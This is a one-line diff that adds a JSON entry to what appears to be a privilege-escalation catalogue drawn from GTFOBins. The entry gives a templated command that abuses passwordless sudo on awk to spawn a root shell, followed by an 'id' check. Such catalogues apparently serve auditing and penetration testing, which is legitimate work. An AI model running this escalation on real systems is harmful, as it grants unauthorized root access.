@@ -1,0 +1,1 @@
+{"id":"sudo_awk","category":"SUDO_NOPASSWD_CUSTOM","binary":"awk","cve":null,"exploitation":["sudo {{binary}} 'BEGIN {system(\"{{shell}}\")}' "],"post_exploit":["id"],"source":"gtfobins.github.io","tags":["sudo","nopasswd","gtfobins"],"severity":"high"}
